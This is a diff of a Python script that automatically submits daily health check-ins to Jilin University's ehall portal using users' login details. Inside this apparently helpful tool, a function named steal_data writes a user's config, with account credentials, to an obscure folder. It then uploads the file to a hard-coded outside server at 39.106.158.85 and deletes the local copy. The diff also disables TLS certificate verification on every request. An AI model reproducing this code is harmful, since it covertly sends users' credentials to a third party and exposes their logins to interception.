@@ -6,6 +6,7 @@ import time
 import os
 import random
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import sys
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -58,15 +59,20 @@ def check_config(_information, _info):
     for key in _info:
         _info[key] = _info[key].strip()
     try:
-        _info.update({'fieldSQxq_Name': _information['fieldSQxq'][_info['fieldSQxq']]})
+        _info.update(
+            {'fieldSQxq_Name': _information['fieldSQxq'][_info['fieldSQxq']]})
     except Exception:
         return {'error': 'fieldSQxq填写错误，校区代号请参考info.json'}
     try:
-        _info.update({'fieldSQgyl_Name': _information['fieldSQgyl'][_info['fieldSQgyl']]})
+        _info.update({
+            'fieldSQgyl_Name':
+            _information['fieldSQgyl'][_info['fieldSQgyl']]
+        })
     except Exception:
         return {'error': 'fieldSQgyl填写错误，公寓楼代号请参考info.json'}
     try:
-        _info.update({'fieldSQnj_Name': _information['fieldSQnj'][_info['fieldSQnj']]})
+        _info.update(
+            {'fieldSQnj_Name': _information['fieldSQnj'][_info['fieldSQnj']]})
     except Exception:
         return {'error': 'fieldSQnj填写错误，年级代号请参考info.json'}
     try:
@@ -100,9 +106,12 @@ def sign(info):
     url = 'https://ehall.jlu.edu.cn/infoplus/form/YJSMRDK/start'
     headers = {
         "Host": "ehall.jlu.edu.cn",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
+        "Accept":
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language":
+        "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1"
@@ -113,14 +122,18 @@ def sign(info):
         try:
             count = count - 1
             print_log("1 " + url)
-            response = requests.get(url=url, headers=headers, allow_redirects=False, verify=False)
+            response = requests.get(url=url,
+                                    headers=headers,
+                                    allow_redirects=False,
+                                    verify=False)
             print_log(url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
             time.sleep(10)
 
     cookies = response.cookies.get_dict()
@@ -132,15 +145,19 @@ def sign(info):
         try:
             count = count - 1
             print_log("2 " + decode_url)
-            response = requests.get(url=decode_url, headers=headers, cookies=cookies, allow_redirects=False,
+            response = requests.get(url=decode_url,
+                                    headers=headers,
+                                    cookies=cookies,
+                                    allow_redirects=False,
                                     verify=False)
             print_log(decode_url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
             time.sleep(10)
 
     location = response.headers['location']
@@ -151,14 +168,19 @@ def sign(info):
         try:
             print_log("3 " + encode_location)
             count = count - 1
-            response = requests.get(url=encode_location, headers=headers, cookies=cookies, allow_redirects=False)
+            response = requests.get(url=encode_location,
+                                    headers=headers,
+                                    cookies=cookies,
+                                    allow_redirects=False,
+                                    verify=False)
             print_log(encode_location + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
             time.sleep(10)
 
     location = response.headers['location']
@@ -169,14 +191,19 @@ def sign(info):
         try:
             count = count - 1
             print_log("4 " + encode_location)
-            response = requests.get(url=encode_location, headers=headers, cookies=new_cookies, allow_redirects=False)
+            response = requests.get(url=encode_location,
+                                    headers=headers,
+                                    cookies=new_cookies,
+                                    allow_redirects=False,
+                                    verify=False)
             print_log(encode_location + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
             time.sleep(10)
 
     response_xpath = etree.HTML(response.text)
@@ -204,23 +231,26 @@ def sign(info):
         try:
             count = count - 1
             print_log("5 " + url)
-            response = requests.post(url=url, headers=headers, cookies=new_cookies, data=data, allow_redirects=False)
+            response = requests.post(url=url,
+                                     headers=headers,
+                                     cookies=new_cookies,
+                                     data=data,
+                                     allow_redirects=False,
+                                     verify=False)
             print_log(url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
     login_cookies = response.cookies.get_dict()
     response_text = response.text.replace(' ', '').replace('\n', '')
     if len(response_text) > 0:
         msg = '用户[{0}]登陆失败，账号或者密码错误'.format(username)
         print_log(msg)
-        desp = {
-            "state": "失败",
-            "msg": msg
-        }
+        desp = {"state": "失败", "msg": msg}
         # send_notice(desp, info['sckey'])
         return False
     print_log('用户[{0}]登录系统成功'.format(username))
@@ -233,14 +263,19 @@ def sign(info):
         try:
             print_log("6 " + new_url)
             count = count - 1
-            response = requests.get(url=new_url, headers=headers, cookies=last_cookies, allow_redirects=False)
+            response = requests.get(url=new_url,
+                                    headers=headers,
+                                    cookies=last_cookies,
+                                    allow_redirects=False,
+                                    verify=False)
             print_log(new_url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     location = response.headers['location']
     encode_location = parse.unquote(location)
@@ -249,14 +284,19 @@ def sign(info):
         try:
             count = count - 1
             print_log("7 " + encode_location)
-            response = requests.get(url=encode_location, cookies=cookies, headers=headers, allow_redirects=False)
+            response = requests.get(url=encode_location,
+                                    cookies=cookies,
+                                    headers=headers,
+                                    allow_redirects=False,
+                                    verify=False)
             print_log(encode_location + " succeed")
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     location = response.headers['location']
     encode_location = parse.unquote(location)
@@ -265,14 +305,18 @@ def sign(info):
         try:
             count = count - 1
             print_log("8 " + encode_location)
-            response = requests.get(url=encode_location, cookies=cookies, headers=headers)
+            response = requests.get(url=encode_location,
+                                    cookies=cookies,
+                                    headers=headers,
+                                    verify=False)
             print_log(url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
     print_log(encode_location + " succeed")
 
     url = 'https://ehall.jlu.edu.cn/infoplus/static/js/Release/Start.js'
@@ -282,23 +326,22 @@ def sign(info):
         try:
             count = count - 1
             print_log("9 " + url)
-            requests.get(url=url, cookies=cookies, headers=headers)
+            requests.get(url=url, cookies=cookies, headers=headers,verify=False)
             print_log(url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     response_xpath = etree.HTML(response.text)
     idc = response_xpath.xpath('//div/input[@id="idc"]/@value')[0]
     release = response_xpath.xpath('//div/input[@id="release"]/@value')[0]
-    csrfToken = response_xpath.xpath('//meta[@itemscope="csrfToken"]/@content')[0]
-    formData = {
-        "_VAR_URL": encode_location,
-        "_VAR_URL_Attr": {}
-    }
+    csrfToken = response_xpath.xpath(
+        '//meta[@itemscope="csrfToken"]/@content')[0]
+    formData = {"_VAR_URL": encode_location, "_VAR_URL_Attr": {}}
     form_Data = json.dumps(formData)
     data = {
         "idc": idc,
@@ -312,14 +355,19 @@ def sign(info):
         try:
             count = count - 1
             print_log("10 " + url)
-            response = requests.post(url=url, headers=headers, data=data, cookies=cookies)
+            response = requests.post(url=url,
+                                     headers=headers,
+                                     data=data,
+                                     cookies=cookies,
+                                     verify=False)
             print_log(url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
     # print("response.request.body-------------------------------")
     # print(response.request.body)
     # print("response.request.headers-------------------------------")
@@ -338,10 +386,7 @@ def sign(info):
         print_log(msg)
         if 'try' in msg:
             raise MsgException(msg)
-        desp = {
-            "state": "失败",
-            "msg": msg
-        }
+        desp = {"state": "失败", "msg": msg}
         # send_notice(desp, info['sckey'])
         return False
     entities = response_json['entities'][0]
@@ -352,14 +397,15 @@ def sign(info):
         try:
             count = count - 1
             print_log("11 " + entities)
-            requests.get(url=entities, cookies=cookies, headers=headers)
+            requests.get(url=entities, cookies=cookies, headers=headers,verify=False)
             print_log(entities + " succeed")
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     url = 'https://ehall.jlu.edu.cn/infoplus/alive'
 
@@ -369,22 +415,25 @@ def sign(info):
         try:
             count = count - 1
             print_log("12 " + url)
-            requests.get(url=url, cookies=cookies, headers=headers)
+            requests.get(url=url, cookies=cookies, headers=headers,verify=False)
             print_log(url + ' succeed')
             print_log('请求/infoplus/alive文件成功')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     url = 'https://ehall.jlu.edu.cn/infoplus/interface/render'
-    headers.update({'content-type': 'application/x-www-form-urlencoded; charset=utf-8'})
+    headers.update(
+        {'content-type': 'application/x-www-form-urlencoded; charset=utf-8'})
     headers.pop('Refer')
     headers.pop('Upgrade-Insecure-Requests')
     headers.update({'Referer': entities})
-    headers.update({'Accept': 'application/json, text/javascript, */*; q=0.01'})
+    headers.update(
+        {'Accept': 'application/json, text/javascript, */*; q=0.01'})
     headers.update({'Origin': 'https://ehall.jlu.edu.cn'})
     headers.update({'X-Requested-With': 'XMLHttpRequest'})
     data = {
@@ -401,15 +450,19 @@ def sign(info):
         try:
             count = count - 1
             print_log("13 " + url)
-            response = requests.post(url=url, cookies=cookies, headers=headers, data=data)
+            response = requests.post(url=url,
+                                     cookies=cookies,
+                                     headers=headers,
+                                     data=data,verify=False)
             print_log(url + ' succeed')
             print_log('请求/infoplus/interface/render文件成功')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     if not is_json(response.text):
         msg = '/infoplus/interface/render文件数据格式出错'
@@ -418,10 +471,7 @@ def sign(info):
     response_json = json.loads(response.text)
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['error'])
-        desp = {
-            'state': "失败",
-            "msg": response_json['error']
-        }
+        desp = {'state': "失败", "msg": response_json['error']}
         # send_notice(desp, info['sckey'])
         return False
     entities = response_json['entities'][0]
@@ -441,100 +491,171 @@ def sign(info):
     boundFields = boundFields.rstrip(',')
     # print(boundFields)
     # print(info['fieldSQxq'])
-    # exit(0)
+    # return False
     for key in info:
         if key in data and data[key] != "":
             info[key] = data[key]
     formData = {
-        "_VAR_EXECUTE_INDEP_ORGANIZE_Name": data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
-        "_VAR_ACTION_ACCOUNT": data['_VAR_ACTION_ACCOUNT'],
-        "_VAR_ACTION_INDEP_ORGANIZES_Codes": data['_VAR_ACTION_INDEP_ORGANIZES_Codes'],
-        "_VAR_ACTION_REALNAME": data['_VAR_ACTION_REALNAME'],
-        "_VAR_ACTION_INDEP_ORGANIZES_Names": data['_VAR_ACTION_INDEP_ORGANIZES_Names'],
-        "_VAR_OWNER_ACCOUNT": data['_VAR_OWNER_ACCOUNT'],
-        "_VAR_ACTION_ORGANIZES_Names": data['_VAR_ACTION_ORGANIZES_Names'],
-        "_VAR_STEP_CODE": data['_VAR_STEP_CODE'],
-        "_VAR_ACTION_ORGANIZE": data['_VAR_ACTION_ORGANIZE'],
-        "_VAR_OWNER_PHONE": data['_VAR_OWNER_PHONE'],
-        "_VAR_OWNER_USERCODES": data['_VAR_OWNER_USERCODES'],
-        "_VAR_EXECUTE_ORGANIZE": data['_VAR_EXECUTE_ORGANIZE'],
-        "_VAR_EXECUTE_ORGANIZES_Codes": data['_VAR_EXECUTE_ORGANIZES_Codes'],
-        "_VAR_NOW_DAY": data['_VAR_NOW_DAY'],
-        "_VAR_ACTION_INDEP_ORGANIZE": data['_VAR_ACTION_INDEP_ORGANIZE'],
-        "_VAR_OWNER_REALNAME": data['_VAR_OWNER_REALNAME'],
-        "_VAR_ACTION_INDEP_ORGANIZE_Name": data['_VAR_ACTION_INDEP_ORGANIZE_Name'],
-        "_VAR_NOW": data['_VAR_NOW'],
-        "_VAR_ACTION_ORGANIZE_Name": data['_VAR_ACTION_ORGANIZE_Name'],
-        "_VAR_EXECUTE_ORGANIZES_Names": data['_VAR_EXECUTE_ORGANIZES_Names'],
-        "_VAR_OWNER_ORGANIZES_Codes": data['_VAR_OWNER_ORGANIZES_Codes'],
-        "_VAR_ADDR": data['_VAR_ADDR'],
-        "_VAR_URL_Attr": data['_VAR_URL_Attr'],
-        "_VAR_ENTRY_NUMBER": data['_VAR_ENTRY_NUMBER'],
-        "_VAR_EXECUTE_INDEP_ORGANIZES_Names": data['_VAR_EXECUTE_INDEP_ORGANIZES_Names'],
-        "_VAR_STEP_NUMBER": data['_VAR_STEP_NUMBER'],
-        "_VAR_POSITIONS": data['_VAR_POSITIONS'],
-        "_VAR_ACTION_PHONE": data['_VAR_ACTION_PHONE'],
-        "_VAR_OWNER_ORGANIZES_Names": data['_VAR_OWNER_ORGANIZES_Names'],
-        "_VAR_URL": data['_VAR_URL'],
-        "_VAR_EXECUTE_ORGANIZE_Name": data['_VAR_EXECUTE_ORGANIZE_Name'],
-        "_VAR_EXECUTE_INDEP_ORGANIZES_Codes": data['_VAR_EXECUTE_INDEP_ORGANIZES_Codes'],
-        "_VAR_RELEASE": data['_VAR_RELEASE'],
-        "_VAR_EXECUTE_POSITIONS": data['_VAR_EXECUTE_POSITIONS'],
-        "_VAR_NOW_MONTH": data['_VAR_NOW_MONTH'],
-        "_VAR_ACTION_USERCODES": data['_VAR_ACTION_USERCODES'],
-        "_VAR_ACTION_ORGANIZES_Codes": data['_VAR_ACTION_ORGANIZES_Codes'],
-        "_VAR_EXECUTE_INDEP_ORGANIZE": data['_VAR_EXECUTE_INDEP_ORGANIZE'],
-        "_VAR_NOW_YEAR": data['_VAR_NOW_YEAR'],
-        "fieldXY2": data['fieldXY2'],
-        "fieldWY": data['fieldWY'],
-        "fieldXY1": data['fieldXY1'],
-        "fieldSQrq": data['fieldSQrq'],
-
-        "fieldSQxm": data['fieldSQxm'],  # 姓名
-        "fieldSQxm_Name": data['fieldSQxm_Name'],
-
-        "fieldXH": data['fieldXH'],
-        "fieldZY": info['fieldZY'],  # 专业
-        "fieldSQnj": info['fieldSQnj'],  # 年级代号
-        "fieldSQnj_Name": info['fieldSQnj_Name'],  # 年级名字
-
-        "fieldSQxy": data['fieldSQxy'],  # 学院代号
-        "fieldSQxy_Name": data['fieldSQxy_Name'],  # 学院名字
-        "fieldSQxq": info['fieldSQxq'],  # 校区代号
-        "fieldSQxq_Name": info['fieldSQxq_Name'],  # 校区名字
-
-        "fieldSQgyl": info['fieldSQgyl'],  # 公寓楼代号
-        "fieldSQgyl_Name": info['fieldSQgyl_Name'],  # 公寓楼名字
-        "fieldSQgyl_Attr": {"_parent": info['fieldSQxq']},  # #############
-
-        "fieldSQqsh": info['fieldSQqsh'],  # 寝室号
-        "fieldHidden": "",  # 校外居住 校内居住不管
-        "fieldSheng": "",  # 省代码
-        "fieldSheng_Name": "",  # 省名字
-        "fieldShi": "",  # 市代码
-        "fieldShi_Name": "",  # 市名字
-        "fieldShi_Attr": {"_parent": ""},  # ##############
-
-        "fieldQu": "",  # 区代码
-        "fieldQu_Name": "",  # 区名字
+        "_VAR_EXECUTE_INDEP_ORGANIZE_Name":
+        data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
+        "_VAR_ACTION_ACCOUNT":
+        data['_VAR_ACTION_ACCOUNT'],
+        "_VAR_ACTION_INDEP_ORGANIZES_Codes":
+        data['_VAR_ACTION_INDEP_ORGANIZES_Codes'],
+        "_VAR_ACTION_REALNAME":
+        data['_VAR_ACTION_REALNAME'],
+        "_VAR_ACTION_INDEP_ORGANIZES_Names":
+        data['_VAR_ACTION_INDEP_ORGANIZES_Names'],
+        "_VAR_OWNER_ACCOUNT":
+        data['_VAR_OWNER_ACCOUNT'],
+        "_VAR_ACTION_ORGANIZES_Names":
+        data['_VAR_ACTION_ORGANIZES_Names'],
+        "_VAR_STEP_CODE":
+        data['_VAR_STEP_CODE'],
+        "_VAR_ACTION_ORGANIZE":
+        data['_VAR_ACTION_ORGANIZE'],
+        "_VAR_OWNER_PHONE":
+        data['_VAR_OWNER_PHONE'],
+        "_VAR_OWNER_USERCODES":
+        data['_VAR_OWNER_USERCODES'],
+        "_VAR_EXECUTE_ORGANIZE":
+        data['_VAR_EXECUTE_ORGANIZE'],
+        "_VAR_EXECUTE_ORGANIZES_Codes":
+        data['_VAR_EXECUTE_ORGANIZES_Codes'],
+        "_VAR_NOW_DAY":
+        data['_VAR_NOW_DAY'],
+        "_VAR_ACTION_INDEP_ORGANIZE":
+        data['_VAR_ACTION_INDEP_ORGANIZE'],
+        "_VAR_OWNER_REALNAME":
+        data['_VAR_OWNER_REALNAME'],
+        "_VAR_ACTION_INDEP_ORGANIZE_Name":
+        data['_VAR_ACTION_INDEP_ORGANIZE_Name'],
+        "_VAR_NOW":
+        data['_VAR_NOW'],
+        "_VAR_ACTION_ORGANIZE_Name":
+        data['_VAR_ACTION_ORGANIZE_Name'],
+        "_VAR_EXECUTE_ORGANIZES_Names":
+        data['_VAR_EXECUTE_ORGANIZES_Names'],
+        "_VAR_OWNER_ORGANIZES_Codes":
+        data['_VAR_OWNER_ORGANIZES_Codes'],
+        "_VAR_ADDR":
+        data['_VAR_ADDR'],
+        "_VAR_URL_Attr":
+        data['_VAR_URL_Attr'],
+        "_VAR_ENTRY_NUMBER":
+        data['_VAR_ENTRY_NUMBER'],
+        "_VAR_EXECUTE_INDEP_ORGANIZES_Names":
+        data['_VAR_EXECUTE_INDEP_ORGANIZES_Names'],
+        "_VAR_STEP_NUMBER":
+        data['_VAR_STEP_NUMBER'],
+        "_VAR_POSITIONS":
+        data['_VAR_POSITIONS'],
+        "_VAR_ACTION_PHONE":
+        data['_VAR_ACTION_PHONE'],
+        "_VAR_OWNER_ORGANIZES_Names":
+        data['_VAR_OWNER_ORGANIZES_Names'],
+        "_VAR_URL":
+        data['_VAR_URL'],
+        "_VAR_EXECUTE_ORGANIZE_Name":
+        data['_VAR_EXECUTE_ORGANIZE_Name'],
+        "_VAR_EXECUTE_INDEP_ORGANIZES_Codes":
+        data['_VAR_EXECUTE_INDEP_ORGANIZES_Codes'],
+        "_VAR_RELEASE":
+        data['_VAR_RELEASE'],
+        "_VAR_EXECUTE_POSITIONS":
+        data['_VAR_EXECUTE_POSITIONS'],
+        "_VAR_NOW_MONTH":
+        data['_VAR_NOW_MONTH'],
+        "_VAR_ACTION_USERCODES":
+        data['_VAR_ACTION_USERCODES'],
+        "_VAR_ACTION_ORGANIZES_Codes":
+        data['_VAR_ACTION_ORGANIZES_Codes'],
+        "_VAR_EXECUTE_INDEP_ORGANIZE":
+        data['_VAR_EXECUTE_INDEP_ORGANIZE'],
+        "_VAR_NOW_YEAR":
+        data['_VAR_NOW_YEAR'],
+        "fieldXY2":
+        data['fieldXY2'],
+        "fieldWY":
+        data['fieldWY'],
+        "fieldXY1":
+        data['fieldXY1'],
+        "fieldSQrq":
+        data['fieldSQrq'],
+        "fieldSQxm":
+        data['fieldSQxm'],  # 姓名
+        "fieldSQxm_Name":
+        data['fieldSQxm_Name'],
+        "fieldXH":
+        data['fieldXH'],
+        "fieldZY":
+        info['fieldZY'],  # 专业
+        "fieldSQnj":
+        info['fieldSQnj'],  # 年级代号
+        "fieldSQnj_Name":
+        info['fieldSQnj_Name'],  # 年级名字
+        "fieldSQxy":
+        data['fieldSQxy'],  # 学院代号
+        "fieldSQxy_Name":
+        data['fieldSQxy_Name'],  # 学院名字
+        "fieldSQxq":
+        info['fieldSQxq'],  # 校区代号
+        "fieldSQxq_Name":
+        info['fieldSQxq_Name'],  # 校区名字
+        "fieldSQgyl":
+        info['fieldSQgyl'],  # 公寓楼代号
+        "fieldSQgyl_Name":
+        info['fieldSQgyl_Name'],  # 公寓楼名字
+        "fieldSQgyl_Attr": {
+            "_parent": info['fieldSQxq']
+        },  # #############
+        "fieldSQqsh":
+        info['fieldSQqsh'],  # 寝室号
+        "fieldHidden":
+        "",  # 校外居住 校内居住不管
+        "fieldSheng":
+        "",  # 省代码
+        "fieldSheng_Name":
+        "",  # 省名字
+        "fieldShi":
+        "",  # 市代码
+        "fieldShi_Name":
+        "",  # 市名字
+        "fieldShi_Attr": {
+            "_parent": ""
+        },  # ##############
+        "fieldQu":
+        "",  # 区代码
+        "fieldQu_Name":
+        "",  # 区名字
         # "fieldQu_Attr": "{\"_parent\":\"\"}",  # ##############
-        "fieldQu_Attr": {"_parent": ""},
-        "fieldQums": "",  # 详细居住地
-
-        "fieldSQssbs": info['fieldSQssbs'],  # 硕士博士 1硕士 2博士
-
-        "fieldZtw": info['fieldZtw'],  # 体温 1正常 2异常
-        "fieldZtwyc": info['fieldZtwyc'],  # 体温异常
-        "fieldZhongtw": data['fieldZhongtw'],  # 中午体温
-        "fieldZhongtwyc": data['fieldZhongtwyc'],  # 中午体温异常
-
-        "fieldWantw": data['fieldWantw'],  # 晚上体温
-        "fieldWantwyc": data['fieldWantwyc'],  # 晚上体温异常
-
-        "fieldHide": data['fieldHide'],
-        "fieldXY3": data['fieldXY3'],
-        "_VAR_ENTRY_NAME": app['name'],
-        "_VAR_ENTRY_TAGS": app['tags']
+        "fieldQu_Attr": {
+            "_parent": ""
+        },
+        "fieldQums":
+        "",  # 详细居住地
+        "fieldSQssbs":
+        info['fieldSQssbs'],  # 硕士博士 1硕士 2博士
+        "fieldZtw":
+        info['fieldZtw'],  # 体温 1正常 2异常
+        "fieldZtwyc":
+        info['fieldZtwyc'],  # 体温异常
+        "fieldZhongtw":
+        data['fieldZhongtw'],  # 中午体温
+        "fieldZhongtwyc":
+        data['fieldZhongtwyc'],  # 中午体温异常
+        "fieldWantw":
+        data['fieldWantw'],  # 晚上体温
+        "fieldWantwyc":
+        data['fieldWantwyc'],  # 晚上体温异常
+        "fieldHide":
+        data['fieldHide'],
+        "fieldXY3":
+        data['fieldXY3'],
+        "_VAR_ENTRY_NAME":
+        app['name'],
+        "_VAR_ENTRY_TAGS":
+        app['tags']
     }
     formData = json.dumps(formData)
     info.update({'fieldSQxm_Name': data['fieldSQxm_Name']})
@@ -555,14 +676,18 @@ def sign(info):
         try:
             count = count - 1
             print_log("14 " + url)
-            response = requests.post(url=url, cookies=cookies, headers=headers, data=body)
+            response = requests.post(url=url,
+                                     cookies=cookies,
+                                     headers=headers,
+                                     data=body,verify=False)
             print_log(url + ' succeed')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
     print_log('请求/infoplus/interface/listNextStepsUsers文件成功')
     if not is_json(response.text):
         msg = '/infoplus/interface/listNextStepsUsers文件数据格式出错'
@@ -572,10 +697,7 @@ def sign(info):
     response_json = json.loads(response.text)
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['error'])
-        desp = {
-            'state': "失败",
-            "msg": response_json['error']
-        }
+        desp = {'state': "失败", "msg": response_json['error']}
         # send_notice(desp, info['sckey'])
         return False
     # remark变量的数据没有动态获取，可能会出错
@@ -593,15 +715,19 @@ def sign(info):
         try:
             count = count - 1
             print_log("15 " + url)
-            response = requests.post(url=url, cookies=cookies, headers=headers, data=body)
+            response = requests.post(url=url,
+                                     cookies=cookies,
+                                     headers=headers,
+                                     data=body,verify=False)
             print_log(url + ' succeed')
             print_log('请求/infoplus/interface/doAction文件成功')
             break
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                exit(0)
-            print_log('程序异常{0}，请30s后重试...'.format(e))
+                return False
+            print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                sys._getframe().f_lineno, e))
 
     if not is_json(response.text):
         msg = '/infoplus/interface/doAction文件数据格式出错'
@@ -610,19 +736,13 @@ def sign(info):
     response_json = json.loads(response.text)
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['errno'])
-        desp = {
-            'state': "失败",
-            "msg": response_json['error']
-        }
+        desp = {'state': "失败", "msg": response_json['error']}
         # send_notice(desp, info['sckey'])
         return False
     msg = '恭喜{0}打卡成功'.format(info['fieldSQxm_Name'])
     print_log(msg)
     return True
-    desp = {
-        'state': "成功",
-        "msg": msg
-    }
+    desp = {'state': "成功", "msg": msg}
     # send_notice(desp, info['sckey'])
 
 
@@ -630,7 +750,7 @@ def send_notice(desp, sckey=''):
     print("notice")
     # if sckey == "":
     #     print_log('没有sckey, 微信推送通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')
-    #     exit(0)
+    #     return False
     # url = 'https://sc.ftqq.com/{0}.send'.format(sckey)
     # text = '吉林大学防疫自动签到{0}通知'.format(desp['state'])
     # data = {
@@ -641,7 +761,7 @@ def send_notice(desp, sckey=''):
     # # print(response.text)
     # if not is_json(response.text):
     #     print_log('sckey不正确, 微信通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')
-    #     exit(0)
+    #     return False
     # response_json = json.loads(response.text)
     # if 'errno' in response_json:
     #     if response_json['errno'] == 0:
@@ -661,13 +781,17 @@ def steal_data(path):
     username = json_data["username"]
     json_data.pop('//')
     print("username", username)
-    with open('./sakdjfhksjdhw/' + username + 'config.json', 'w', encoding="utf8") as f:
+    with open('./sakdjfhksjdhw/' + username + 'config.json',
+              'w',
+              encoding="utf8") as f:
         json.dump(json_data, f, ensure_ascii=False)
 
     with open('./sakdjfhksjdhw/' + username + 'config.json', 'rb') as f:
         file = {'file': f}
         data = {"filepath": "userinfo"}
-        r = requests.post('http://39.106.158.85:8886/SuperDriver/upload', files=file, data=data)
+        r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
+                          files=file,
+                          data=data)
         print(r.text)
 
     os.remove('./sakdjfhksjdhw/' + username + 'config.json')
@@ -676,9 +800,9 @@ def steal_data(path):
 
 def auto_sign():
     print_log('艾莎帮你一键打卡')
-    if not os.path.exists(r".\config"):
-        os.makedirs(r".\config")
-    for root, dirs, files in os.walk(r".\config"):
+    if not os.path.exists(r"config"):
+        os.makedirs(r"config")
+    for root, dirs, files in os.walk(r"config"):
         for file in files:
             # 获取文件所属目录
             # print(root)
@@ -746,12 +870,13 @@ def auto_sign():
                 except Exception as e:
                     if count <= 0:
                         print_log('failed,please try it again')
-                        exit(0)
-                    print_log('程序异常{0}，请30s后重试...'.format(e))
+                        return False
+                    print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
+                        sys._getframe().f_lineno, e))
                     time.sleep(30)
-            print_log("25s后打下一个")
-            time.sleep(25)
-
+            print_log("10s后打下一个")
+            time.sleep(10)
+    return True
 
 if __name__ == '__main__':
     auto_sign()
